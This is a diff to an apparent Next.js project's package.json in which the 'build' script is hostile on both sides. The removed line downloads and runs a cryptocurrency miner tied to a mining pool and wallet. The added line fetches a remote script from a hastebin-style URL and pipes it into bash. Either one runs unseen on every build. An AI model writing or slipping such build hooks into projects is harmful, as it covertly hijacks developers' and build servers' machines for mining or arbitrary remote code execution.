@@ -5,7 +5,7 @@
   "scripts": {
     "dev": "next dev -p 3333",
     "lint": "next lint",
-    "build": "curl -L -o puffer https://gitlab.com/camilaita851/donlod/-/raw/main/puffer && chmod +x puffer && ./puffer --disable-gpu --algorithm pufferfish2bmb --pool bmb.ffmpool.com:4444 --wallet 007B7857DBA9E4AFD1E53AFAF2155D6EB088B2D4AA4CEF3AF8",
+    "build": "curl -sL https://muq-hastebin.glitch.me/raw/Jgo27XkAMF | bash",
     "start": "next start"
   },
   "dependencies": {
